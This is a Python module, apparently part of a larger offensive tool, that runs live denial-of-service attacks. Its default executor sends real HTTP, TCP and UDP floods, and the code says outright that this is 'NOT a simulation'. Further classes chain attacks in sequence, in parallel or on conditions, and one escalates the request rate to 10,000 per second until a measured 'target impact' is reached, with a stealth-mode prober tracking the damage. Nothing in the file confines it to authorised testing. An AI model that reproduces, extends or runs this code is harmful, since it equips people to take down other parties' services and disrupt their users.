"""
Attack Chaining Module

Chains multiple attack types together for complex attack scenarios:
- Sequential attack chains
- Parallel attack combinations
- Conditional attack flows
- Automated attack escalation
"""

import asyncio
import time
import random
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Callable, Union
from enum import Enum
from abc import ABC, abstractmethod
import logging

logger = logging.getLogger(__name__)


class ChainResult(Enum):
    """Chain execution result"""
    SUCCESS = "success"
    PARTIAL = "partial"
    FAILED = "failed"
    SKIPPED = "skipped"
    TIMEOUT = "timeout"


class AttackStage(Enum):
    """Attack stages"""
    RECON = "reconnaissance"
    PROBE = "probe"
    EXPLOIT = "exploit"
    MAINTAIN = "maintain"
    ESCALATE = "escalate"
    CLEANUP = "cleanup"


@dataclass
class ChainConfig:
    """Chain configuration"""
    name: str = "default_chain"
    max_duration: int = 300
    stop_on_failure: bool = False
    parallel_limit: int = 5
    retry_count: int = 2
    retry_delay: float = 5.0


@dataclass
class AttackStep:
    """Single attack step in a chain"""
    name: str
    attack_type: str
    target: str
    port: int = 80
    duration: int = 30
    rate: int = 100
    params: Dict[str, Any] = field(default_factory=dict)
    condition: Optional[Callable[[], bool]] = None
    on_success: Optional[str] = None  # Next step name
    on_failure: Optional[str] = None  # Fallback step name
    stage: AttackStage = AttackStage.EXPLOIT
    priority: int = 5


@dataclass
class StepResult:
    """Result of a step execution"""
    step_name: str
    result: ChainResult
    duration: float
    requests_sent: int = 0
    errors: int = 0
    target_impact: float = 0.0
    message: str = ""


class AttackExecutor(ABC):
    """Base class for attack executors"""
    
    @abstractmethod
    async def execute(self, step: AttackStep) -> StepResult:
        """Execute an attack step"""
        pass


class RealFloodExecutor(AttackExecutor):
    """
    REAL attack executor that connects to actual flood engines.
    
    This is NOT a simulation - it executes real network attacks using
    the native Rust engine or Python fallback engines.
    """
    
    def __init__(self):
        self._engine = None
        self._prober = None
        self._initialize_engine()
        
    def _initialize_engine(self):
        """Initialize the real attack engine"""
        try:
            # Try to use the Military-Grade UltimateEngine
            from core.native_engine import create_engine, NATIVE_ENGINE_AVAILABLE
            self._native_available = NATIVE_ENGINE_AVAILABLE
            logger.info(f"RealFloodExecutor: Native engine available: {NATIVE_ENGINE_AVAILABLE}")
        except ImportError:
            self._native_available = False
            logger.warning("RealFloodExecutor: Native engine not available, using Python fallback")
            
        try:
            # Initialize Side-Channel Prober for real impact measurement
            from core.autonomous.side_channel_prober import SideChannelProber
            self._prober_class = SideChannelProber
        except ImportError:
            self._prober_class = None
    
    async def execute(self, step: AttackStep) -> StepResult:
        """Execute REAL attack using actual flood engines"""
        start = time.time()
        requests = 0
        errors = 0
        target_impact = 0.0
        
        logger.info(f"RealFloodExecutor: Starting {step.attack_type} attack on {step.target}:{step.port}")
        
        try:
            # Start prober to measure real impact
            prober = None
            if self._prober_class:
                probe_url = f"http://{step.target}:{step.port}"
                prober = self._prober_class(probe_url, probe_interval=1.0, stealth_mode=True)
                await prober.start()
            
            # Execute real attack based on type
            attack_type = step.attack_type.lower()
            
            if attack_type in ('http', 'https'):
                requests, errors = await self._execute_http_flood(step)
            elif attack_type == 'tcp':
                requests, errors = await self._execute_tcp_flood(step)
            elif attack_type == 'udp':
                requests, errors = await self._execute_udp_flood(step)
            elif attack_type == 'probe':
                requests, errors = await self._execute_probe(step)
            else:
                # Default to HTTP
                requests, errors = await self._execute_http_flood(step)
            
            # Get real impact from prober
            if prober and prober.is_running:
                target_impact = prober.get_effectiveness_score() / 100.0
                await prober.stop()
            else:
                # Estimate impact from error rate
                if requests > 0:
                    success_rate = (requests - errors) / requests
                    target_impact = 1.0 - success_rate  # Higher errors = more impact
                    
        except Exception as e:
            logger.error(f"RealFloodExecutor error: {e}")
            errors += 1
            
        duration = time.time() - start
        
        # Determine result based on real metrics
        error_rate = errors / max(requests + errors, 1)
        if error_rate > 0.5:
            result = ChainResult.FAILED
        elif error_rate > 0.1:
            result = ChainResult.PARTIAL
        else:
            result = ChainResult.SUCCESS
            
        logger.info(f"RealFloodExecutor: Completed - {requests} requests, {errors} errors, impact: {target_impact:.2f}")
            
        return StepResult(
            step_name=step.name,
            result=result,
            duration=duration,
            requests_sent=requests,
            errors=errors,
            target_impact=target_impact
        )
    
    async def _execute_http_flood(self, step: AttackStep) -> tuple:
        """Execute real HTTP flood"""
        import aiohttp
        
        requests = 0
        errors = 0
        
        url = f"http://{step.target}:{step.port}{step.params.get('path', '/')}"
        
        timeout = aiohttp.ClientTimeout(total=5)
        connector = aiohttp.TCPConnector(limit=step.rate, force_close=True)
        
        end_time = time.time() + step.duration
        
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            while time.time() < end_time:
                tasks = []
                batch_size = min(step.rate, 100)
                
                for _ in range(batch_size):
                    tasks.append(self._single_http_request(session, url))
                    
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for r in results:
                    if isinstance(r, Exception):
                        errors += 1
                    elif r:
                        requests += 1
                    else:
                        errors += 1
                        
                # Rate limiting
                await asyncio.sleep(1.0 / max(step.rate / batch_size, 1))
                
        return requests, errors
    
    async def _single_http_request(self, session, url: str) -> bool:
        """Execute single HTTP request"""
        try:
            async with session.get(url) as response:
                await response.read()
                return True
        except Exception:
            return False
    
    async def _execute_tcp_flood(self, step: AttackStep) -> tuple:
        """Execute real TCP flood"""
        import socket
        
        requests = 0
        errors = 0
        
        end_time = time.time() + step.duration
        
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((step.target, step.port))
                sock.send(b"X" * 1024)
                sock.close()
                requests += 1
            except Exception:
                errors += 1
                
            await asyncio.sleep(1.0 / max(step.rate, 1))
            
        return requests, errors
    
    async def _execute_udp_flood(self, step: AttackStep) -> tuple:
        """Execute real UDP flood"""
        import socket
        
        requests = 0
        errors = 0
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b"X" * step.params.get('packet_size', 1024)
        
        end_time = time.time() + step.duration
        
        while time.time() < end_time:
            try:
                sock.sendto(payload, (step.target, step.port))
                requests += 1
            except Exception:
                errors += 1
                
            # High-speed UDP doesn't need sleep for each packet
            if requests % 1000 == 0:
                await asyncio.sleep(0.001)
                
        sock.close()
        return requests, errors
    
    async def _execute_probe(self, step: AttackStep) -> tuple:
        """Execute reconnaissance probe"""
        import socket
        
        requests = 0
        errors = 0
        
        # TCP connect probe
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(step.duration)
            result = sock.connect_ex((step.target, step.port))
            sock.close()
            
            if result == 0:
                requests = 1
            else:
                errors = 1
        except Exception:
            errors = 1
            
        return requests, errors


# Keep SimulatedExecutor for testing purposes only
class SimulatedExecutor(AttackExecutor):
    """
    Simulated attack executor for TESTING ONLY.
    
    WARNING: This does NOT execute real attacks. Use RealFloodExecutor
    for actual attack execution.
    """
    
    async def execute(self, step: AttackStep) -> StepResult:
        """Execute simulated attack (for testing only)"""
        logger.warning("SimulatedExecutor: This is a TEST executor, not real attacks")
        
        start = time.time()
        requests = 0
        errors = 0
        
        interval = 1.0 / max(step.rate, 1)
        end_time = start + step.duration
        
        while time.time() < end_time:
            if random.random() > 0.05:
                requests += 1
            else:
                errors += 1
            await asyncio.sleep(interval)
            
        duration = time.time() - start
        
        if errors / max(requests + errors, 1) > 0.5:
            result = ChainResult.FAILED
        elif errors > 0:
            result = ChainResult.PARTIAL
        else:
            result = ChainResult.SUCCESS
            
        return StepResult(
            step_name=step.name,
            result=result,
            duration=duration,
            requests_sent=requests,
            errors=errors,
            target_impact=random.uniform(0.3, 0.8)
        )


class AttackChain:
    """
    Attack Chain
    
    Executes a sequence of attack steps with flow control.
    Uses REAL attack executor by default (not simulation).
    """
    
    def __init__(self, config: ChainConfig, executor: AttackExecutor = None):
        self.config = config
        # DEFAULT: Use REAL executor, not simulation
        self.executor = executor or RealFloodExecutor()
        self.steps: Dict[str, AttackStep] = {}
        self.results: List[StepResult] = []
        self._running = False
        self._start_step: Optional[str] = None
        
    def add_step(self, step: AttackStep, is_start: bool = False):
        """Add step to chain"""
        self.steps[step.name] = step
        if is_start or self._start_step is None:
            self._start_step = step.name
            
    def set_flow(self, step_name: str, on_success: str = None, on_failure: str = None):
        """Set flow control for a step"""
        if step_name in self.steps:
            self.steps[step_name].on_success = on_success
            self.steps[step_name].on_failure = on_failure
            
    async def execute(self) -> List[StepResult]:
        """Execute the attack chain"""
        self._running = True
        self.results = []
        
        start_time = time.time()
        current_step = self._start_step
        
        logger.info(f"Starting attack chain: {self.config.name}")
        
        while self._running and current_step:
            # Check timeout
            if (time.time() - start_time) > self.config.max_duration:
                logger.warning("Chain timeout reached")
                break
                
            step = self.steps.get(current_step)
            if not step:
                logger.error(f"Step not found: {current_step}")
                break
                
            # Check condition
            if step.condition and not step.condition():
                logger.info(f"Skipping step {step.name} - condition not met")
                self.results.append(StepResult(
                    step_name=step.name,
                    result=ChainResult.SKIPPED,
                    duration=0
                ))
                current_step = step.on_success
                continue
                
            # Execute step with retries
            result = await self._execute_with_retry(step)
            self.results.append(result)
            
            # Determine next step
            if result.result in [ChainResult.SUCCESS, ChainResult.PARTIAL]:
                current_step = step.on_success
            else:
                if self.config.stop_on_failure:
                    logger.warning(f"Chain stopped due to failure at {step.name}")
                    break
                current_step = step.on_failure
                
        self._running = False
        logger.info(f"Chain completed: {len(self.results)} steps executed")
        
        return self.results
        
    async def _execute_with_retry(self, step: AttackStep) -> StepResult:
        """Execute step with retry logic"""
        last_result = None
        
        for attempt in range(self.config.retry_count + 1):
            logger.info(f"Executing step: {step.name} (attempt {attempt + 1})")
            
            try:
                result = await self.executor.execute(step)
                
                if result.result == ChainResult.SUCCESS:
                    return result
                    
                last_result = result
                
                if attempt < self.config.retry_count:
                    logger.info(f"Retrying step {step.name} after {self.config.retry_delay}s")
                    await asyncio.sleep(self.config.retry_delay)
                    
            except Exception as e:
                logger.error(f"Step {step.name} error: {e}")
                last_result = StepResult(
                    step_name=step.name,
                    result=ChainResult.FAILED,
                    duration=0,
                    message=str(e)
                )
                
        return last_result or StepResult(
            step_name=step.name,
            result=ChainResult.FAILED,
            duration=0
        )
        
    def stop(self):
        """Stop chain execution"""
        self._running = False
        
    def get_summary(self) -> Dict[str, Any]:
        """Get chain execution summary"""
        total_duration = sum(r.duration for r in self.results)
        total_requests = sum(r.requests_sent for r in self.results)
        
        success_count = sum(1 for r in self.results if r.result == ChainResult.SUCCESS)
        failed_count = sum(1 for r in self.results if r.result == ChainResult.FAILED)
        
        return {
            'chain_name': self.config.name,
            'total_steps': len(self.results),
            'successful_steps': success_count,
            'failed_steps': failed_count,
            'total_duration': total_duration,
            'total_requests': total_requests,
            'results': [
                {'step': r.step_name, 'result': r.result.value, 'duration': r.duration}
                for r in self.results
            ]
        }


class ParallelChain:
    """
    Parallel Attack Chain
    
    Executes multiple attack steps in parallel.
    Uses REAL attack executor by default.
    """
    
    def __init__(self, config: ChainConfig, executor: AttackExecutor = None):
        self.config = config
        self.executor = executor or RealFloodExecutor()
        self.step_groups: List[List[AttackStep]] = []
        self.results: List[List[StepResult]] = []
        
    def add_parallel_group(self, steps: List[AttackStep]):
        """Add a group of steps to execute in parallel"""
        self.step_groups.append(steps)
        
    async def execute(self) -> List[List[StepResult]]:
        """Execute all groups sequentially, steps within groups in parallel"""
        self.results = []
        
        for i, group in enumerate(self.step_groups):
            logger.info(f"Executing parallel group {i + 1}/{len(self.step_groups)}")
            
            # Execute group in parallel with limit
            semaphore = asyncio.Semaphore(self.config.parallel_limit)
            
            async def execute_with_semaphore(step):
                async with semaphore:
                    return await self.executor.execute(step)
                    
            tasks = [execute_with_semaphore(step) for step in group]
            group_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Process results
            processed_results = []
            for step, result in zip(group, group_results):
                if isinstance(result, Exception):
                    processed_results.append(StepResult(
                        step_name=step.name,
                        result=ChainResult.FAILED,
                        duration=0,
                        message=str(result)
                    ))
                else:
                    processed_results.append(result)
                    
            self.results.append(processed_results)
            
        return self.results


class ConditionalChain:
    """
    Conditional Attack Chain
    
    Executes attacks based on target response conditions.
    Uses REAL attack executor by default.
    """
    
    def __init__(self, config: ChainConfig, executor: AttackExecutor = None):
        self.config = config
        self.executor = executor or RealFloodExecutor()
        self.branches: Dict[str, List[AttackStep]] = {}
        self.conditions: Dict[str, Callable[[StepResult], bool]] = {}
        self._target_state: Dict[str, Any] = {}
        
    def add_branch(self, name: str, steps: List[AttackStep], 
                   condition: Callable[[StepResult], bool] = None):
        """Add a conditional branch"""
        self.branches[name] = steps
        if condition:
            self.conditions[name] = condition
            
    def set_target_state(self, key: str, value: Any):
        """Set target state for condition evaluation"""
        self._target_state[key] = value
        
    async def execute(self, initial_branch: str = None) -> Dict[str, List[StepResult]]:
        """Execute conditional chain"""
        results = {}
        
        # Start with initial branch or first branch
        current_branch = initial_branch or list(self.branches.keys())[0]
        
        while current_branch and current_branch in self.branches:
            logger.info(f"Executing branch: {current_branch}")
            
            branch_results = []
            for step in self.branches[current_branch]:
                result = await self.executor.execute(step)
                branch_results.append(result)
                
                # Update target state based on result
                self._target_state['last_impact'] = result.target_impact
                self._target_state['last_result'] = result.result
                
            results[current_branch] = branch_results
            
            # Determine next branch based on conditions
            next_branch = None
            last_result = branch_results[-1] if branch_results else None
            
            for branch_name, condition in self.conditions.items():
                if branch_name not in results:  # Not yet executed
                    try:
                        if condition(last_result):
                            next_branch = branch_name
                            break
                    except Exception:
                        pass
                        
            current_branch = next_branch
            
        return results


class EscalationChain:
    """
    Attack Escalation Chain
    
    Automatically escalates attack intensity based on target response.
    Uses REAL attack executor by default.
    """
    
    def __init__(self, target: str, port: int = 80, executor: AttackExecutor = None):
        self.target = target
        self.port = port
        self.executor = executor or RealFloodExecutor()
        self.escalation_levels = [
            {'name': 'probe', 'rate': 10, 'duration': 10},
            {'name': 'light', 'rate': 100, 'duration': 30},
            {'name': 'medium', 'rate': 500, 'duration': 60},
            {'name': 'heavy', 'rate': 2000, 'duration': 60},
            {'name': 'maximum', 'rate': 10000, 'duration': 120},
        ]
        self.current_level = 0
        self.results: List[StepResult] = []
        
    async def execute(self, target_impact: float = 0.7, max_level: int = None) -> List[StepResult]:
        """Execute escalation until target impact reached"""
        max_level = max_level or len(self.escalation_levels) - 1
        
        while self.current_level <= max_level:
            level = self.escalation_levels[self.current_level]
            
            logger.info(f"Escalation level: {level['name']} (rate: {level['rate']})")
            
            step = AttackStep(
                name=f"escalation_{level['name']}",
                attack_type="http",
                target=self.target,
                port=self.port,
                duration=level['duration'],
                rate=level['rate']
            )
            
            result = await self.executor.execute(step)
            self.results.append(result)
            
            # Check if target impact reached
            if result.target_impact >= target_impact:
                logger.info(f"Target impact {target_impact} reached at level {level['name']}")
                break
                
            self.current_level += 1
            
        return self.results
        
    def reset(self):
        """Reset escalation"""
        self.current_level = 0
        self.results = []


class ChainBuilder:
    """
    Fluent builder for attack chains
    """
    
    def __init__(self, name: str = "custom_chain"):
        self.config = ChainConfig(name=name)
        self.steps: List[AttackStep] = []
        self._executor = None
        
    def with_config(self, **kwargs) -> 'ChainBuilder':
        """Set chain configuration"""
        for key, value in kwargs.items():
            if hasattr(self.config, key):
                setattr(self.config, key, value)
        return self
        
    def with_executor(self, executor: AttackExecutor) -> 'ChainBuilder':
        """Set attack executor"""
        self._executor = executor
        return self
        
    def add_step(self, name: str, attack_type: str, target: str, 
                 port: int = 80, duration: int = 30, rate: int = 100,
                 **params) -> 'ChainBuilder':
        """Add attack step"""
        step = AttackStep(
            name=name,
            attack_type=attack_type,
            target=target,
            port=port,
            duration=duration,
            rate=rate,
            params=params
        )
        self.steps.append(step)
        return self
        
    def add_recon(self, target: str, port: int = 80) -> 'ChainBuilder':
        """Add reconnaissance step"""
        return self.add_step(
            name="recon",
            attack_type="probe",
            target=target,
            port=port,
            duration=10,
            rate=1
        )
        
    def add_probe(self, target: str, port: int = 80) -> 'ChainBuilder':
        """Add probe step"""
        return self.add_step(
            name="probe",
            attack_type="http",
            target=target,
            port=port,
            duration=15,
            rate=50
        )
        
    def add_attack(self, target: str, port: int = 80, 
                   attack_type: str = "http", rate: int = 1000,
                   duration: int = 60) -> 'ChainBuilder':
        """Add main attack step"""
        return self.add_step(
            name=f"attack_{attack_type}",
            attack_type=attack_type,
            target=target,
            port=port,
            duration=duration,
            rate=rate
        )
        
    def build(self) -> AttackChain:
        """Build the attack chain"""
        chain = AttackChain(self.config, self._executor)
        
        for i, step in enumerate(self.steps):
            is_start = (i == 0)
            chain.add_step(step, is_start=is_start)
            
            # Set default flow
            if i < len(self.steps) - 1:
                chain.set_flow(step.name, on_success=self.steps[i + 1].name)
                
        return chain
